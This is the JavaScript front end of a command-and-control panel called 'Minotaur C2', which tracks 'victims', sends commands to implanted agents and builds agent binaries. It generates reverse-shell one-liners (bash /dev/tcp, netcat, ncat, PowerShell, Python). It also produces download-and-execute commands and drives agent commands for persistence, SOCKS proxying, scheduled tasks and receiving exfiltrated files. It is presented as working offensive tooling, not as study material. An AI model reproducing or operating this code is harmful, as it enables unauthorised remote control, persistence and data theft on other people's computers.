const socket = io();

let savedOutputs = {};

socket.on('connect', () => console.log('[Socket.IO] Connected to Minotaur C2'));

function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

function getAgentStatus(lastBeaconIso, thresholdSeconds = 180) {
    if (!lastBeaconIso) return { text: 'Unknown', color: 'gray' };
    const last = new Date(lastBeaconIso).getTime();
    const now = Date.now();
    const diffSec = (now - last) / 1000;
    if (diffSec <= thresholdSeconds) return { text: 'Online', color: 'green' };
    else return { text: 'Offline', color: 'red' };
}

// ==================== TAB SWITCHING ====================
function switchTab(tabId) {
    $('.tab-btn').removeClass('tab-active');
    $(`#tab-${tabId}`).addClass('tab-active');
    $('#tcp-section, #agents-section, #logs-section, #build-section').addClass('hidden');
    $(`#${tabId}-section`).removeClass('hidden');
    if (tabId === 'agents') loadAgents();
    if (tabId === 'logs') { loadShellLogs(); loadAgentLogs(); }
    if (tabId === 'build') { loadAvailableAgents(); loadAgentVersions(); }
}
$('#tab-tcp').click(() => switchTab('tcp'));
$('#tab-agents').click(() => switchTab('agents'));
$('#tab-logs').click(() => switchTab('logs'));
$('#tab-build').click(() => switchTab('build'));

// Log subtabs
$('#tab-shell-logs').click(function() {
    $(this).addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
    $('#tab-agent-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
    $('#shell-logs-panel').removeClass('hidden');
    $('#agent-logs-panel').addClass('hidden');
    loadShellLogs();
});
$('#tab-agent-logs').click(function() {
    $(this).addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
    $('#tab-shell-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
    $('#agent-logs-panel').removeClass('hidden');
    $('#shell-logs-panel').addClass('hidden');
    loadAgentLogs();
});

// ==================== MODAL SHELL COMMAND ====================
$('#gen-shell-btn').click(function() { $('#shell-modal').css('display', 'block'); updateShellCommand(); });
$('#close-modal').click(function() { $('#shell-modal').css('display', 'none'); });
$(window).click(function(event) { if (event.target == document.getElementById('shell-modal')) $('#shell-modal').css('display', 'none'); });
function updateShellCommand() {
    let ip = $('#shell-ip').val(), port = $('#shell-port').val(), type = $('#shell-type').val(), cmd = '';
    if (type === 'bash') cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    else if (type === 'nc') cmd = `nc -e /bin/bash ${ip} ${port}`;
    else if (type === 'ncat') cmd = `ncat --ssl ${ip} ${port} -e /bin/bash`;
    else if (type === 'powershell') cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    else if (type === 'python') cmd = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
    $('#shell-output-cmd').val(cmd);
}
$('#shell-ip, #shell-port, #shell-type').on('input change', updateShellCommand);
$('#copy-shell-cmd').click(function() { $('#shell-output-cmd').select(); document.execCommand('copy'); alert('Command copied to clipboard'); });

// ==================== TCP SHELLS ====================
function saveCurrentOutputs() { savedOutputs = {}; $('.output-box').each(function() { const victimId = $(this).attr('id').replace('output-', ''); savedOutputs[victimId] = $(this).html(); }); }
function restoreOutputs() { for (const [victimId, content] of Object.entries(savedOutputs)) { const outputDiv = $(`#output-${victimId}`); if (outputDiv.length && content) { outputDiv.html(content); outputDiv.scrollTop(outputDiv[0].scrollHeight); } } }
function loadVictims() {
    saveCurrentOutputs();
    fetch('/api/victims').then(res => res.json()).then(data => {
        const tbody = $('#victim-table-body').empty(), victimSelect = $('#victim-select').empty(), outputsContainer = $('#outputs-container').empty();
        data.forEach(v => {
            const shortId = v.id.substring(0,8), lastSeen = new Date(v.last_seen).toLocaleString();
            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50"><td class="px-4 py-2 font-mono text-xs">${shortId}</td><td class="px-4 py-2">${v.hostname} (${v.ip}:${v.port})</td><td class="px-4 py-2"><span class="px-2 py-1 rounded text-xs ${v.os_type === 'unknown' ? 'bg-gray-600' : v.os_type === 'linux' ? 'bg-blue-800' : v.os_type === 'windows' ? 'bg-green-800' : 'bg-purple-800'}">${v.os_type}</span></td><td class="px-4 py-2 text-xs">${lastSeen}</td><td class="px-4 py-2"><button class="set-os-btn bg-purple-700 hover:bg-purple-800 text-xs px-2 py-1 rounded" data-id="${v.id}"><i class="fas fa-edit"></i> Override OS</button></td></td>`);
            tbody.append(row);
            victimSelect.append(`<option value="${v.id}">${v.hostname} (${v.ip})</option>`);
            const outputDiv = $(`<div class="bg-gray-900 rounded-lg p-3"><div class="text-sm font-mono text-gray-300 mb-2"><i class="fas fa-terminal text-green-400 mr-2"></i> ${v.hostname} (${v.ip})<span class="text-gray-500 text-xs ml-2">ID: ${shortId} | OS: ${v.os_type}</span></div><div id="output-${v.id}" class="output-box"></div></div>`);
            outputsContainer.append(outputDiv);
        });
        $('.set-os-btn').off('click').on('click', function() { const victimId = $(this).data('id'); const newOs = prompt("Enter OS type (linux, windows, darwin, unknown):"); if (newOs && ['linux','windows','darwin','unknown'].includes(newOs.toLowerCase())) { fetch('/api/set_os', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ victim_id: victimId, os_type: newOs.toLowerCase() }) }).then(() => loadVictims()); } else alert("Invalid OS. Use: linux, windows, darwin, unknown"); });
        restoreOutputs();
    });
}

// ==================== HTTP AGENTS ====================
function loadAgents() {
    fetch('/api/agents').then(res => res.json()).then(agents => {
        const tbody = $('#agents-table-body').empty(), agentSelect = $('#agent-select').empty().append('<option value="">-- Select an agent --</option>');
        agents.forEach(a => {
            const shortId = a.id.substring(0,8), lastBeacon = new Date(a.last_beacon).toLocaleString(), status = getAgentStatus(a.last_beacon, 180), statusHtml = `<span class="inline-block w-2 h-2 rounded-full mr-1" style="background-color: ${status.color};"></span>${status.text}`;
            const row = $(`<tr class="border-b border-gray-700 bg-gray-800/50 agent-row"><td class="px-4 py-2 font-mono text-xs">${shortId}</td><td class="px-4 py-2">${a.hostname}</td><td class="px-4 py-2">${a.os}/${a.arch}</td><td class="px-4 py-2">${a.ip}</td><td class="px-4 py-2">${a.version || '?'}</td><td class="px-4 py-2 text-xs">${lastBeacon}</td><td class="px-4 py-2 text-xs">${statusHtml}</td><td class="px-4 py-2"><button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded" data-id="${a.id}"><i class="fas fa-terminal"></i> Shell</button><button class="update-agent-btn bg-green-600 hover:bg-green-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}" data-platform="${a.platform}"><i class="fas fa-sync-alt"></i> Update</button><button class="delete-agent-btn bg-red-600 hover:bg-red-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}"><i class="fas fa-trash"></i> Delete</button></td></tr>`);
            tbody.append(row);
            agentSelect.append(`<option value="${a.id}">${a.hostname} (${a.ip})</option>`);
        });
    });
}
$(document).on('click', '.delete-agent-btn', function() { const agentId = $(this).data('id'); if (confirm(`Permanently delete agent ${agentId.substring(0,8)}? This will also attempt to remove it from the victim system.`)) { fetch('/api/agent/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({agent_id: agentId}) }).then(() => { $('#agent-log').prepend(`<div class="text-red-400">🗑️ Agent ${agentId.substring(0,8)} deleted</div>`); loadAgents(); }); } });
$(document).on('click', '.shell-agent-btn', function() { const agentId = $(this).data('id'); const c2ip = prompt("Enter C2 IP address:", window.location.hostname); if (!c2ip) return; const port = prompt("Enter port number (must be already open on C2):", "4444"); if (!port) return; fetch('/api/agent/shell', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({agent_id: agentId, ip: c2ip, port: port}) }).then(() => { $('#agent-log').prepend(`<div class="text-purple-400">→ Reverse shell requested to ${c2ip}:${port}</div>`); }).catch(err => console.error(err)); });
$(document).on('click', '.update-agent-btn', function() {
    const agentId = $(this).data('id');
    const platform = $(this).data('platform');
    const c2Url = $('#build-c2-url').val();
    fetch('/api/agent/versions').then(res => res.json()).then(versions => {
        const current = versions.find(v => v.platform === platform && v.is_current);
        if (!current) {
            alert('No current version set for this platform');
            return;
        }
        const fullUrl = `${c2Url}/static/agents/versions/${platform.replace('/', '_')}/${current.filename}`;
        const payload = { version: current.version, url: fullUrl };
        fetch('/api/agent/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ agent_id: agentId, type: 'update', payload: payload })
        }).then(() => {
            $('#agent-log').prepend(`<div class="text-blue-400">→ Update command sent to agent ${agentId.substring(0,8)} (version ${current.version})</div>`);
        }).catch(err => alert('Error sending update: ' + err));
    });
});
$('#clear-all-agents-btn').click(function() { if (confirm('⚠️ WARNING: This will permanently delete ALL agents from the database. This action cannot be undone. Continue?')) { fetch('/api/agents/clear_all', { method: 'POST', headers: { 'Content-Type': 'application/json' } }).then(() => { $('#agent-log').prepend('<div class="text-red-400">🗑️ All agents have been cleared from the database.</div>'); loadAgents(); }).catch(err => console.error(err)); } });
$('#refresh-agents-btn').click(() => loadAgents());

// Agent command arguments (including health)
const commandArgs = {
    exec: [{ name: "command", placeholder: "system command", type: "text" }],
    config: [{ name: "setting", placeholder: "setting name", type: "text" }, { name: "value", placeholder: "value", type: "text" }],
    shell: [{ name: "command", placeholder: "command to execute", type: "text" }],
    powershell: [{ name: "command", placeholder: "PowerShell command", type: "text" }],
    proxy: [{ name: "port", placeholder: "port to listen on", type: "number" }],
    "shell-reverse": [{ name: "ip", placeholder: "C2 IP", type: "text" }, { name: "port", placeholder: "port", type: "number" }],
    health: [],
    socks: [{ name: "port", placeholder: "port to listen on", type: "number" }],  // no arguments
    schedule: [
    { name: "action", placeholder: "add / list / remove", type: "text" },
    { name: "name", placeholder: "task name (unique identifier)", type: "text" },
    { name: "schedule", placeholder: "e.g., once 2025-12-31 23:59, daily 14:30, hourly, minute 5", type: "text" },
    { name: "command", placeholder: "command to execute", type: "text" }
    ],
    restart: [
    { name: "delay", placeholder: "delay in seconds (Windows) or minutes (Linux)", type: "text" },
    { name: "message", placeholder: "optional shutdown message (Windows only)", type: "text" }
    ],
    proxy_stop: [{ name: "port", placeholder: "port number or 'all'", type: "text" }]
};
function updateCommandArgs() {
    const cmdType = $('#agent-cmd-type').val();
    const argsDiv = $('#agent-cmd-args').empty();
    const args = commandArgs[cmdType] || [];
    if (args.length === 0 && !['help','checkin','proc','net','persistence','update','delete','health'].includes(cmdType)) {
        argsDiv.html('<div class="text-gray-400 text-sm">No additional arguments required</div>');
        return;
    }
    args.forEach(arg => {
        if (arg.type === 'textarea') {
            argsDiv.append(`<div class="mb-2"><label class="block text-xs text-gray-400 mb-1">${arg.name}</label><textarea id="cmd-arg-${arg.name}" class="w-full bg-gray-700 rounded px-3 py-2 text-sm" placeholder="${arg.placeholder}" rows="3"></textarea></div>`);
        } else {
            argsDiv.append(`<div class="mb-2"><label class="block text-xs text-gray-400 mb-1">${arg.name}</label><input type="${arg.type}" id="cmd-arg-${arg.name}" class="w-full bg-gray-700 rounded px-3 py-2 text-sm" placeholder="${arg.placeholder}"></div>`);
        }
    });
}
$('#agent-cmd-type').change(updateCommandArgs);
updateCommandArgs();
$('#agent-exec-btn').click(() => {
    const agentId = $('#agent-select').val();
    if (!agentId) { alert("Please select an agent from the dropdown."); return; }
    const cmdType = $('#agent-cmd-type').val();
    let payload = {};
    if (cmdType === 'exec') { const command = $('#cmd-arg-command').val(); if (!command) { alert("Please enter a command"); return; } payload = { command: command }; }
    else if (cmdType === 'config') { const setting = $('#cmd-arg-setting').val(); const value = $('#cmd-arg-value').val(); if (!setting) { alert("Please enter setting name"); return; } payload = { setting: setting, value: value || "" }; }
    else if (cmdType === 'shell' || cmdType === 'powershell') { const command = $('#cmd-arg-command').val(); if (!command) { alert("Please enter a command"); return; } payload = { command: command }; }
    else if (cmdType === 'proxy') { const port = $('#cmd-arg-port').val(); if (!port) { alert("Please enter port number"); return; } payload = { port: port }; }
    else if (cmdType === 'shell-reverse') { const ip = $('#cmd-arg-ip').val(), port = $('#cmd-arg-port').val(); if (!ip || !port) { alert("Please enter IP and port"); return; } payload = { ip: ip, port: port }; }
    else if (['persistence','delete','help','checkin','proc','net','update','health'].includes(cmdType)) { payload = {}; }
    else if (cmdType === 'schedule') {
    const action = $('#cmd-arg-action').val();
    const name = $('#cmd-arg-name').val();
    const schedule = $('#cmd-arg-schedule').val();
    const command = $('#cmd-arg-command').val();
    if (!action || !name || !schedule || !command) {
        alert("Please fill all schedule fields");
        return;
    }
    payload = { action: action, name: name, schedule: schedule, command: command };
    }
    else if (cmdType === 'socks') {
    const port = $('#cmd-arg-port').val();
    if (!port) { alert("Please enter port number"); return; }
    payload = { port: port };
    }
    else if (cmdType === 'proxy_stop') {
    const port = $('#cmd-arg-port').val();
    if (!port) { alert("Please enter port number or 'all'"); return; }
    payload = { port: port };
    }
    else if (cmdType === 'restart') {
    const delay = $('#cmd-arg-delay').val();
    const message = $('#cmd-arg-message').val();
    payload = { delay: delay || "0", message: message || "" };
    }
    else { alert("Unknown command type"); return; }
    fetch('/api/agent/send_command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ agent_id: agentId, type: cmdType, payload: payload }) })
        .then(() => { $('#agent-log').prepend(`<div class="text-blue-400">→ ${cmdType} command sent to agent ${agentId.substring(0,8)}</div>`); updateCommandArgs(); })
        .catch(err => console.error("Error sending command:", err));
});

// ==================== PORT MANAGEMENT ====================
function loadActivePorts() { fetch('/api/active_ports').then(res => res.json()).then(ports => { const container = $('#active-ports-list').empty(); if (ports.length === 0) { container.html('<div class="text-gray-500">No ports open. Use "Open New Port" to start listening.</div>'); return; } ports.forEach(port => { container.append(`<div class="bg-gray-700 rounded-lg px-3 py-1 flex items-center gap-2"><i class="fas fa-door-open text-green-400"></i><span class="font-mono">${port}</span><button class="stop-port-btn text-red-400 hover:text-red-300 text-xs" data-port="${port}"><i class="fas fa-stop"></i> Stop</button></div>`); }); $('.stop-port-btn').off('click').on('click', function() { stopListener($(this).data('port')); }); $('#listener-count').text(ports.length); }); }
function stopListener(port) { fetch('/api/stop_port', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ port: port }) }).then(() => loadActivePorts()); }
function loadPortEvents() { fetch('/api/port_events?limit=30').then(res => res.json()).then(events => { const logDiv = $('#port-log').empty(); if (!events.length) logDiv.html('<div class="text-gray-500">→ no connection events yet</div>'); else events.slice().reverse().forEach(e => { logDiv.prepend(`<div class="text-green-400 border-b border-gray-800 py-1">[${new Date(e.timestamp).toLocaleTimeString()}] 🔌 Port ${e.port} → connection from ${e.ip}</div>`); }); }); }
$('#target-select').change(function() { if ($(this).val() === 'single') { $('#single-target-div').show(); $('#os-target-div').hide(); } else { $('#single-target-div').hide(); $('#os-target-div').show(); } }).trigger('change');
$('#exec-btn').click(() => { const command = $('#command-input').val(); if (!command.trim()) return; const targetType = $('#target-select').val(); let payload = { target: targetType, command: command }; if (targetType === 'single') payload.victim_id = $('#victim-select').val(); else payload.os_type = $('#os-select').val(); if (targetType === 'single') { const victimId = payload.victim_id; const outputDiv = $(`#output-${victimId}`); if (outputDiv.length) { const time = new Date().toLocaleTimeString(); outputDiv.append(`<div class="command-separator">--- [${time}] $ ${command} ---</div>`); outputDiv.scrollTop(outputDiv[0].scrollHeight); } } fetch('/api/execute', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(err => console.error(err)); });
$('input[name="port-mode"]').change(function() { if ($(this).val() === 'single') { $('#single-port-input').show(); $('#range-port-input').hide(); } else { $('#single-port-input').hide(); $('#range-port-input').show(); } });
$('#open-port-btn').click(() => { const port = $('#new-port').val(); if (!port) return; fetch('/api/open_port', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ port: parseInt(port) }) }).then(() => { $('#port-log').prepend(`<div class="text-yellow-300">✅ Listening on port ${port}</div>`); $('#new-port').val(''); loadActivePorts(); }); });
$('#new-port').on('keypress', function(e) { if (e.which === 13) { e.preventDefault(); $('#open-port-btn').click(); } });
$('#open-range-btn').click(() => { const range = $('#port-range').val().trim(); if (!range) return; fetch('/api/open_ports', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ range: range }) }).then(res => res.json()).then(results => { let success=0,fail=0; results.forEach(r=>{if(r.status==='listening'){success++;$('#port-log').prepend(`<div class="text-yellow-300">✅ Listening on port ${r.port}</div>`);} else {fail++;$('#port-log').prepend(`<div class="text-red-400">❌ Failed to open port ${r.port}: ${r.error}</div>`);}}); $('#port-log').prepend(`<div class="text-blue-300">📡 Opened ${success} port(s) (${fail} failed)</div>`); $('#port-range').val(''); loadActivePorts(); }); });

// ==================== ACTIVITY LOGS ====================
function populateVictimFilter() { fetch('/api/logs/victims').then(res=>res.json()).then(victimIds=>{const select=$('#shell-log-filter').empty().append('<option value="">-- All victims --</option>'); victimIds.forEach(id=>{select.append(`<option value="${id}">${id.substring(0,8)}</option>`);}); loadShellLogs();}); }
function populateAgentFilter() { fetch('/api/logs/agents').then(res=>res.json()).then(agentIds=>{const select=$('#agent-log-filter').empty().append('<option value="">-- All agents --</option>'); agentIds.forEach(id=>{select.append(`<option value="${id}">${id.substring(0,8)}</option>`);}); loadAgentLogs();}); }
function loadShellLogs() { const victimId=$('#shell-log-filter').val(); let url='/api/activity/shell?limit=200'; if(victimId) url+='&victim_id='+victimId; fetch(url).then(res=>res.json()).then(logs=>{const container=$('#shell-logs-container').empty(); logs.forEach(log=>{const time=new Date(log.timestamp).toLocaleString();const prefix=log.direction==='sent'?'→':'←';const color=log.direction==='sent'?'text-blue-400':'text-green-400';if(log.direction==='sent') container.append(`<div class="${color} mb-1">[${time}] ${prefix} [${log.victim_id.substring(0,8)}] COMMAND: ${log.command}</div>`); else container.append(`<div class="${color} mb-1">[${time}] ${prefix} [${log.victim_id.substring(0,8)}] ${log.output}</div>`);});}); }
function loadAgentLogs() { const agentId=$('#agent-log-filter').val(); let url='/api/activity/agent?limit=200'; if(agentId) url+='&agent_id='+agentId; fetch(url).then(res=>res.json()).then(logs=>{const container=$('#agent-logs-container').empty(); logs.forEach(log=>{const sent=new Date(log.sent_at).toLocaleString();const completed=log.completed_at?new Date(log.completed_at).toLocaleString():'pending';container.append(`<div class="border-b border-dashed border-gray-600 mb-3 pb-3"><div class="text-yellow-400 font-mono">[${sent}] Agent ${log.agent_id.substring(0,8)} | Type: ${log.type}</div><div class="text-gray-400 ml-4 text-xs">Payload: ${escapeHtml(log.payload)}</div><div class="text-green-400 ml-4 whitespace-pre-wrap font-mono text-xs">Result: ${escapeHtml(log.output || log.error || '(no result)')}</div><div class="text-gray-500 text-xs ml-4">Completed: ${completed}</div></div>`);});}); }
$('#refresh-shell-logs').click(loadShellLogs);
$('#refresh-agent-logs').click(loadAgentLogs);
$('#download-shell-logs').click(()=>{const filterId=$('#shell-log-filter').val(); let url='/api/export/logs?type=shell'; if(filterId) url+='&id='+filterId; window.location.href=url;});
$('#download-agent-logs').click(()=>{const filterId=$('#agent-log-filter').val(); let url='/api/export/logs?type=agent'; if(filterId) url+='&id='+filterId; window.location.href=url;});

// ==================== BUILD & VERSION ====================
$('#build-agent-btn').click(function() {
    const buildBtn = $(this), statusDiv = $('#build-status');
    statusDiv.removeClass('hidden').html('<div class="text-yellow-400">⏳ Compiling, please wait...</div>');
    buildBtn.prop('disabled', true);
    const data = {
        c2_url: $('#build-c2-url').val(),
        beacon_delay: parseInt($('#build-beacon-delay').val()),
        jitter: parseInt($('#build-jitter').val()),
        user_agent: $('#build-user-agent').val(),
        insecure_tls: $('#build-insecure-tls').is(':checked'),
        auto_persistence: $('#build-auto-persistence').is(':checked'),
        debug_mode: $('#build-debug-mode').is(':checked'),
        enable_auth: $('#build-enable-auth').is(':checked'),
        goos: $('#build-goos').val(),
        goarch: $('#build-goarch').val()
    };
    console.log("Building with C2 URL:", data.c2_url);
    fetch('/api/build_agent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) throw new Error(data.error);
        statusDiv.html('<div class="text-green-400">✅ Build successful! Agent saved to server.</div>');
        loadAvailableAgents();
        loadAgentVersions();
    })
    .catch(err => {
        console.error(err);
        statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.message}</div>`);
    })
    .finally(() => {
        buildBtn.prop('disabled', false);
        setTimeout(() => statusDiv.addClass('hidden'), 8000);
    });
});

function loadAvailableAgents() {
    const c2Url = $('#build-c2-url').val();
    fetch('/api/agents/list').then(res => res.json()).then(agents => {
        const container = $('#available-agents-list').empty();
        if (agents.length === 0) {
            container.html('<div class="text-gray-500">No agents compiled yet. Use the form above to build one.</div>');
            return;
        }
        agents.forEach(agent => {
            const fullUrl = `${c2Url}${agent.url}`;
            const agentName = agent.filename;
            let downloadCmd = '', alternativeCmd = '', osLabel = '';
            if (agentName.includes('windows')) {
                osLabel = 'Windows';
                downloadCmd = `powershell -c "Invoke-WebRequest -Uri '${fullUrl}' -OutFile $env:temp\\agent.exe; Start-Process $env:temp\\agent.exe"`;
            } else if (agentName.includes('linux')) {
                osLabel = 'Linux';
                downloadCmd = `wget -O minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
                alternativeCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
            } else if (agentName.includes('darwin')) {
                osLabel = 'macOS';
                downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
            } else {
                osLabel = 'Unknown';
                downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
            }
            const card = $(`
                <div class="bg-gray-900 rounded-lg p-3">
                    <div class="flex justify-between items-start">
                        <div>
                            <div class="font-mono text-sm">${agentName} (${osLabel})</div>
                            <div class="text-gray-400 text-xs">Size: ${(agent.size/1024).toFixed(1)} KB | Last built: ${new Date(agent.modified).toLocaleString()}</div>
                        </div>
                        <a href="${fullUrl}" class="bg-blue-600 px-3 py-1 rounded text-sm hover:bg-blue-700">Download</a>
                    </div>
                    <div class="mt-2">
                        <label class="text-xs text-gray-400">One‑liner download & execute:</label>
                        <div class="relative">
                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all" id="cmd-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">${downloadCmd}</code></pre>
                            <button class="copy-btn absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-xs px-2 py-1 rounded" data-cmd-id="cmd-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>
                        ${alternativeCmd ? `<label class="text-xs text-gray-400 mt-2 block">Alternative (curl):</label>
                        <div class="relative">
                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all" id="alt-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">${alternativeCmd}</code></pre>
                            <button class="copy-btn absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-xs px-2 py-1 rounded" data-cmd-id="alt-${agent.filename.replace(/[^a-zA-Z0-9]/g, '_')}">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>` : ''}
                    </div>
                </div>
            `);
            container.append(card);
        });
        // Attach copy event handlers
        $('.copy-btn').off('click').on('click', function() {
            const cmdId = $(this).data('cmd-id');
            const text = $('#' + cmdId).text();
            navigator.clipboard.writeText(text).then(() => {
                const originalHtml = $(this).html();
                $(this).html('<i class="fas fa-check"></i> Copied!');
                setTimeout(() => $(this).html(originalHtml), 2000);
            }).catch(err => {
                console.error('Failed to copy:', err);
            });
        });
    });
}

function loadAgentVersions() {
    fetch('/api/agent/versions').then(res => res.json()).then(versions => {
        const tbody = $('#agent-versions-table-body').empty();
        versions.forEach(v => {
            const compiled = new Date(v.compiled_at).toLocaleString(), sizeKB = (v.size / 1024).toFixed(1), isCurrent = v.is_current;
            let actionBtn;
            if (isCurrent) {
                actionBtn = '<span class="text-green-400 text-xs">Current</span>';
            } else {
                actionBtn = `<div class="flex gap-1"><button class="set-current-version bg-blue-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Set as Current</button><button class="delete-version-btn bg-red-600 px-2 py-1 rounded text-xs" data-platform="${v.platform}" data-version="${v.version}">Delete</button></div>`;
            }
            const row = $(`
                <tr class="border-b border-gray-700"><td class="px-4 py-2 font-mono text-xs">${v.version}</td><td class="px-4 py-2 text-xs">${v.platform}</td><td class="px-4 py-2 text-xs">${compiled}</td><td class="px-4 py-2 text-xs">${sizeKB} KB</td><td class="px-4 py-2 text-xs">${actionBtn}</td></tr>`);
            tbody.append(row);
        });
        $('.set-current-version').off('click').on('click', function() {
            const platform = $(this).data('platform'), version = $(this).data('version');
            fetch('/api/agent/set_current_version', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ platform: platform, version: version }) }).then(() => loadAgentVersions());
        });
        $('.delete-version-btn').off('click').on('click', function() {
            const platform = $(this).data('platform'), version = $(this).data('version');
            if (confirm(`Delete version ${version} for ${platform}? This action cannot be undone.`)) {
                fetch('/api/agent/delete_version', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ platform: platform, version: version }) })
                    .then(() => loadAgentVersions());
            }
        });
    });
}

// ==================== SOCKET.IO REAL-TIME ====================
socket.on('new_victim', () => loadVictims());
socket.on('victim_disconnected', () => loadVictims());
socket.on('victim_updated', () => loadVictims());
socket.on('port_connection', (event) => { $('#port-log').prepend(`<div class="text-cyan-300">🔔 Port ${event.port} connected from ${event.ip}</div>`); });
socket.on('shell_output', (data) => { const outputDiv = $(`#output-${data.victim_id}`); if (outputDiv.length) { outputDiv.append(data.line + '\n'); outputDiv.scrollTop(outputDiv[0].scrollHeight); } });
socket.on('new_agent', () => { if ($('#agents-section').is(':visible')) loadAgents(); });
socket.on('agent_result', (data) => { const log = $('#agent-log'), prefix = `[Agent ${data.agent_id.substring(0,8)}]`, resultText = data.output || data.error || '(no output)'; log.prepend(`<div class="text-green-300 mb-3 border-b border-gray-700 pb-2"><div class="font-bold mb-1">${prefix} Result:</div><pre class="bg-gray-800 p-2 rounded text-xs whitespace-pre-wrap break-words mt-1 max-h-48 overflow-auto">${escapeHtml(resultText)}</pre></div>`); });
socket.on('exfil_received', (data) => { $('#agent-log').prepend(`<div class="text-yellow-300 mb-2">📁 Exfiltrated: ${data.file_path} from agent ${data.agent_id.substring(0,8)}</div>`); });
socket.on('agent_deleted', () => loadAgents());
socket.on('agents_cleared', () => { loadAgents(); $('#agent-log').prepend('<div class="text-red-400">⚠️ Agent list cleared by another operator.</div>'); });

// ==================== INITIAL LOADS ====================
loadVictims();
loadPortEvents();
loadActivePorts();
populateVictimFilter();
populateAgentFilter();
setInterval(() => { loadVictims(); loadActivePorts(); if ($('#agents-section').is(':visible')) loadAgents(); }, 30000);